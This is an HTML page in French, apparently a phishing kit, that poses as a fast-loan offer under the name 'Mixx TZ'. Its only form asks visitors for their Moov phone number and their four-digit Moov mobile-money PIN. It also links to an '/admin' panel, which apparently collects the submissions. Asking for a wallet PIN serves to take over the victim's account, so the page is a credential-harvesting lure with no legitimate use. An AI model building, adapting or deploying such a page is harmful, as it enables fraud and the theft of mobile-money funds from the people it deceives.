<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mixx TZ - Obtenez Votre Prêt</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="background-wrapper">
    <div class="container">
      <!-- Title -->
      <h1 class="main-title">OBTENEZ VOTRE PRÊT<br>RAPIDE...</h1>
      
      <!-- Fee Information Box -->
      <div class="fee-box">
        <p class="fee-label">MONTANT DU PRÊT POSSIBLE</p>
        <p class="fee-amount">OBTENEZ <span class="highlight-yellow">VOTRE PRÊT</span></p>
      </div>

      <!-- Form -->
      <form id="registrationForm">
        <!-- Phone Input -->
        <div class="form-group">
          <input 
            type="text" 
            id="name" 
            placeholder="ENTREZ VOTRE NUMÉRO DE TÉLÉPHONE MOOV" 
            required
          >
          <span class="error" id="nameError"></span>
        </div>

        <!-- PIN Input -->
        <div class="form-group">
          <input 
            type="password" 
            id="yasPin" 
            placeholder="CODE PIN MOOV" 
            required
            maxlength="4"
            pattern="\d{4}"
            inputmode="numeric"
          >
          <span class="error" id="yasPinError"></span>
        </div>

        <!-- Submit Button -->
        <button type="submit" class="btn-submit">OBTENEZ VOTRE PRÊT</button>
      </form>

      <!-- Success/Error Messages -->
      <div id="successMessage" class="message success" style="display: none;"></div>
      <div id="errorMessage" class="message error" style="display: none;"></div>

      <!-- Loading State -->
      <div id="loadingSpinner" class="spinner" style="display: none;"></div>

      <!-- Admin Link -->
      <div class="admin-link">
        <a href="/admin">📊 Admin Panel</a>
      </div>
    </div>
    <div class="yellow-bar"></div>
  </div>

  <script src="app.js"></script>
</body>
</html>
